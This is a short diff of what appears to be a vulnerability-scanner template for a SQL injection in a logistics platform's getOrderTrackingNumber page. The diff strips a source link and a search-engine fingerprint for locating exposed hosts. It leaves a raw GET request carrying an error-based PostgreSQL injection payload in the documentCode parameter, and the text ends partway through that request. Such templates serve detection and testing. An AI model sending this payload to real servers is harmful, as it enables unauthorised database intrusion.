@@ -3,12 +3,8 @@ info:
   name: 华磊科技物流-getOrderTrackingNumber-pg-SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hk35gyfnvyrizhfb'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hk35gyfnvyrizhfb
-    fofa: body="l_c_bar"||body="l_c_center"
 http:
 - raw:
   - 'GET /getOrderTrackingNumber.htm?documentCode=a%27and%0A1=user::integer-- HTTP/1.1
